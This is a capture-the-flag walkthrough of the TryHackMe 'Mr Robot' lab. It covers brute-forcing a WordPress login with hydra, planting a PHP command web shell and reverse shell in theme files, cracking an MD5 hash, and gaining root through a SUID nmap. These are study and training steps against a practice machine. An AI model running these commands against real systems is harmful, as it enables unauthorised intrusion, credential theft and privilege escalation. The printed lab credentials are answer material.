---
title: TryHackMe | Mr Robot CTF
author: Zeropio
date: 2022-09-25
categories: [TryHackMe, Rooms]
tags: [thm, linux]
permalink: /tryhackme/mr-robot-ctf
---


# Foothold

The nmap show:

```
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
```

The nmap doesn’t tell us which OS is. With `ping` we can see the ttl:

```console
zero@pio$ ping 10.10.3.202 
	PING 10.10.3.202 (10.10.3.202) 56(84) bytes of data.
	64 bytes from 10.10.3.202: icmp_seq=1 ttl=63 time=74.9 ms
```

With the **ttl=63** we can probably is Linux. Both webpages show the same, a copy of the Mr Robot show. We can see that the page ends with a terminal prompt. We can see a bunch of aviable commands:

```
prepare
fsociety
inform
question
wakeup
join
```

We found some webpages with some commands, like **/fsociety**, **/inform**, **/question**, **/wakeup** and **/join**. In the last one, the page ask for an email.

If we fuzz by directories:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.3.202/FUZZ'

	admin                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 62ms]
	images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 63ms]
	js                      [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 63ms]
	wp-content              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 61ms]
	css                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 59ms]
	wp-admin                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 60ms]
	wp-includes             [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 61ms]
	blog                    [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 49ms]
	xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1402ms]
	login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1444ms]
	feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 775ms]
	rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 787ms]
	video                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 62ms]
	sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
	image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 705ms]
	audio                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 49ms]
	phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 314ms]
	dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 689ms]
	wp-login                [Status: 200, Size: 2606, Words: 115, Lines: 53, Duration: 2060ms]
```

We see that is a wordpress. The login page redirect to the **/wp-login.php**. We can also found the **/robots.txt**, where we have the first flag:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

The **/fsocity.dic** page will download the file, a passlist. Let’s try finding some valid username and using the wordlist. First we start with:

```console
zero@pio$ curl http://10.10.3.202/wp-json/wp/v2/users | jq
```

But we got to a non existent page. 

---

# Fingerprint

We see that the page **http://10.10.99.194/xmlrpc.php** it is up. We can try enumerating user through it , without succes.

```console
zero@pio$ wpscan --url 'http://10.10.3.202/' --enumerate u
zero@pio$ sudo wpscan --password-attack xmlrpc -t 20 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P fsocity.dic --url 'http://10.10.3.202/'
```

We can try some names until we found **Elliot**. Now we can use `hydra`:

```console
zero@pio$ hydra -l Elliot -P fsocity.dic 10.10.3.202 -s 80 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=<div id="login_error">' -t 30

	[80][http-post-form] host: 10.10.3.202   login: Elliot   password: ER28-0652
```

Now that we are login we can do the classical reverse shell in the Wordpress themes. We will edit the `http://10.10.3.202/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen` file to create a reverse shell. We will add `system($_GET['cmd']);` at the beginning of the file. Now we can test it:

```console
zero@pio$ curl -X GET 'http://10.10.3.202/wp-content/themes/twentyfifteen/404.php?cmd=id'

	uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

We cannot get a reverse shell from there so we will edit `http://10.10.3.202/wp-admin/theme-editor.php?file=archive.php&theme=twentyfifteen&scrollto=2967`. Copy and paste the [pentestmonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) reverse shell and access the system.

---

# Privilege Escalation

We found an user in the `/home`{: .filepath} folder. Inside of it, there is a md5 password:

```console
$ cd /home/     
$ ls
	robot
$ cd robot
$ ls
	key-2-of-3.txt
	password.raw-md5
$ cat key-2-of-3.txt
	cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
	robot:c3fcd3d76192e4007dfb496cca67e13b
```

With `john` we can crack it easily:

```console
zero@pio$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash 
	Created directory: /home/zeropio/.john
	Using default input encoding: UTF-8
	Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
	Press 'q' or Ctrl-C to abort, almost any other key for status
	abcdefghijklmnopqrstuvwxyz (?)
```

We cannot use commands like `su` or `sudo`. We need to upgrade the shell and login:

```console
$ su robot
	su: must be run from a terminal
$  python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
	su robot
	Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
```

We can search for SUID permissions:

```console
robot@linux:~$  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
	-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
	-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
	-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
	-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
	-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
	-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
	-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
	-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
	-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
	-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
	-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
	-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
	-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
	-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
```

We found `nmap` between them. Searching in [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#shell) we found a possible explotation:

```console
robot@linux:/usr/local/bin$ nmap --interactive

	Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
	Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh               
# whoami
	root
```

The last flag is in the `/root`{: .filepath} directory.